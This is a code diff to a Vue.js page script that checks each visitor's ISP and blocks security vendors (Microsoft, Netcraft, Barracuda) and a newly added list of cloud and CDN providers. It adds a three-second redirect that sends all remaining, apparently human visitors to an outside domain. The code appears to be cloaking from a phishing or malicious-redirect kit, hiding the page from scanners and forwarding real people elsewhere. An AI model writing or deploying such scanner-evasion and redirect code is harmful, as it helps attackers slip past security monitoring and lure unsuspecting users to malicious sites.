@@ -21,22 +21,24 @@ const app = createApp({
         visitorIP.value = ipInfo.data.ip;
         const isp = ipInfo.data.org.toLowerCase();
 
-        const blockedISPs = ["microsoft", "netcraft", "barracuda"];
-        const penaltyKey = `penalty_${visitorIP.value}`;
-        const penaltyData = JSON.parse(localStorage.getItem(penaltyKey)) || { count: 0, expiry: null };
-        const now = new Date().getTime();
+        // Updated list of ISPs to block on all attempts
+        const blockedISPs = [
+          "microsoft",
+          "netcraft",
+          "barracuda",
+          "amazon",
+          "google",
+          "ovh",
+          "digitalocean",
+          "cloudflare",
+          "fastly",
+          "akamai",
+          "oracle",
+          "ibm",
+          "linode"
+        ];
 
         if (blockedISPs.some(blockedISP => isp.includes(blockedISP))) {
-          if (penaltyData.expiry && now < penaltyData.expiry) {
-            isBlocked.value = true;
-            return;
-          }
-
-          penaltyData.count += 1;
-          penaltyData.expiry = penaltyData.count === 1 ? now + 60 * 60 * 1000 :
-                               penaltyData.count === 2 ? now + 24 * 60 * 60 * 1000 :
-                                                         now + 365 * 24 * 60 * 60 * 1000;
-          localStorage.setItem(penaltyKey, JSON.stringify(penaltyData));
           isBlocked.value = true;
           return;
         }
@@ -51,6 +53,12 @@ const app = createApp({
 
     onMounted(async () => {
       await checkVisitorReputation();
+      
+      if (!isBot.value && !isBlocked.value) {
+        setTimeout(() => {
+          window.location.href = 'https://tk.altinbasaknevresim.com.tr/';
+        }, 3000);
+      }
     });
 
     return { loading, isBot, isBlocked };
